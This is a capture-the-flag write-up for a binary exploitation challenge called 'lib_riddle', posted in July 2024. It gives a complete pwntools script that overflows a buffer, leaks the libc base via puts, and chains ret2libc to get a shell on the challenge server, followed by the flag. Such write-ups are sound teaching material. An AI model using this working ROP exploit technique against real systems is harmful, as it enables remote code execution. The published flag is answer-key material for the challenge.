https://ctftime.org/event/2416

# lib_riddle (pwn)

Welcome to Lib-Riddle, where the library holds a secret deep inside its stacks. In this hilarious and intriguing challenge, you'll sift through piles of books and quirky clues to uncover the hidden mystery. Can you crack the code and reveal the library's best-kept secret? Dive in and let the quest for knowledge begin!

nc 34.125.199.248 7809

## Solution

1) ret2plt to leak libc base
2) ret2libc to get shell

Note that I used the `libc.so.6` from another challenge to have the same as the remote:

```
$ sha256sum libc.so.6 
46dcc397c118276bc5b4fa3fa918a0590da5e63fb3915f146784be2c903a3654  libc.so.6
```

```python
#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./challenge", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 7809)

p.readuntil(b"What's your name?\n")

rop = ROP(elf)
rop.raw('A' * 0x18)
rop.puts(elf.got['puts'])
rop.raw(elf.sym['main'])
p.sendline(rop.chain())

p.readline()
p.readline()
leak = struct.unpack("<Q", p.read(6) + b"\x00\x00")[0]
log.success(f"leak: {hex(leak)}")

libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A" * 0x18)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())

p.readline()
p.readline()
p.readline()
p.readline()
p.sendline(b"/bin/cat /home/flag.txt")
log.success(p.readline().decode()) # OSCTF{l1br4ry_m4de_0f_5y5call5}
```

## Flag
`OSCTF{l1br4ry_m4de_0f_5y5call5}`

smiley 2024/07/13
